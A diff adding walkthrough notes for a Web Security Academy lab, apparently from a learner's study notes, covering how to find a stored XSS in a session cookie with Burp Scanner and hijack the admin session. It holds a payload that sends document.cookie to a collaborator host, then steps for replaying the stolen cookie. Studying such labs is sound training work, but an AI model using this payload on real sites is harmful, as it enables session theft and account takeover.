@@ -133,18 +133,34 @@ Hint: `If you get stuck, try looking up our Academy topic on the identified vuln
 
 ### Scanning non-standard data structures
 
+Background:
 
+```
+This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.
 
+To solve the lab, use Burp Scanner's Scan selected insertion point feature to identify the vulnerability, then manually exploit it and delete carlos.
 
+You can log in to your own account with the following credentials: wiener:peter 
+```
 
+Part 1 Identify the vulnerability:
+- log into your account
+- find the `GET /my-account?id=wiener` request in burp history, which has your auth cookie
+- study the session cookie and notice that it contains your username in cleartext, followed by a token of some kind, seperated by a colon
+- select the first part of the session cookie with your username and right click to select `scan selected insertion point` then click `OK`
+- wait for it to finish for burp to show that it found a stored XSS in the parameter
 
+Part 2 Steal the admin user's cookies:
+- now in your burp dashboard select the XSS issue
+- open the request tab and send it to repeater
+- select the cookie value in repeater and in inspector insert this with a collaborator payload to update it, make sure not to update the second part of the cookie: ```'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID```
+- click `apply changes` and send
+- in collaborator poll it until you see new DNS and HTTP interactions
+- open the HTTP interaction and on the `request to collaborator` tab notice that the path of the request contains the admin users cookies
 
-
-
-
-
-
-
-
-
-
+Part 3 use the admin users cookie to access the admin panel
+- copy the admin users session cookie
+- go to bnurps browser and open the `DevTools` menu
+- go to the application tab and select `Cookies`
+- replace your session cookie with the admin users session cookie and refresh the page
+- access the admin panel and delete `carlos` to finish the lab
